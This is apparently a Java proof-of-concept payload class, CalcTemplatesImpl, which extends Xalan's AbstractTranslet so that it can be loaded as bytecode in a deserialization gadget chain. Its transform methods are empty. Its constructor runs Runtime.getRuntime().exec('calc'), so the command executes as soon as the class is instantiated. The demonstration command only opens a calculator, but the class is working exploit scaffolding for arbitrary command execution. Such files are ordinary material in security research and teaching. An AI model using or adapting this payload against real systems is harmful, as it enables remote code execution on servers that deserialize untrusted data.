package org.example;

import org.apache.xalan.xsltc.DOM;
import org.apache.xalan.xsltc.TransletException;
import org.apache.xalan.xsltc.runtime.AbstractTranslet;
import org.apache.xml.dtm.DTMAxisIterator;
import org.apache.xml.serializer.SerializationHandler;

import java.io.IOException;

public class CalcTemplatesImpl extends AbstractTranslet {
    public void transform(DOM document, SerializationHandler[] handlers)
            throws TransletException {
    }

    public void transform(DOM document, DTMAxisIterator iterator,
                          SerializationHandler handler) throws TransletException {
    }

    public CalcTemplatesImpl() throws IOException {
        Runtime.getRuntime().exec("calc");
    }
}
